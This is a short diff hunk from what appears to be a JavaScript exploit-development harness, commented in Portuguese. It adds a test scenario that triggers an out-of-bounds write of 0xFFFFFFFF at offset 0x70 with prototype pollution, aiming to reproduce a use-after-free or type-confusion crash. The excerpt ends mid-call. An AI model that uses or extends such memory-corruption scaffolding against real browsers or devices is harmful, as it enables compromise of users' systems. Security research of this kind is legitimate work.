@@ -11,7 +11,17 @@ async function runFocusedTests_DetectEarlyCorruption() {
     const FNAME_RUNNER = "runFocusedTests_DetectEarlyCorruption";
     logS3(`==== INICIANDO TESTES DIRECIONADOS JSON TC (Detectar Corrupção Cedo) ====`, 'test', FNAME_RUNNER);
 
-    
+    // Cenário 1: OOB write de 0xFFFFFFFF em 0x70 + PP com toJSON simples e logging detalhado.
+    // Tentar recriar o crash original UAF/Type Confusion.
+    await runSpecificJsonTypeConfusionTest(
+        "Focus_OOB_0x70_FFFF_PP_SimpleToJSON_DetailLog",
+        0x70,       // corruptionOffset
+        0xFFFFFFFF, // valueToWrite
+        true,       // enablePP
+        true,       // attemptOOBWrite
+        false       // skipOOBEnvironmentSetup (configura ambiente OOB)
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
     
     // Cenário 3 (da rodada anterior): OOB Write com VALOR NULO (0x0) em 0x70, PP com toJSON simples e logging detalhado.
     await runSpecificJsonTypeConfusionTest(
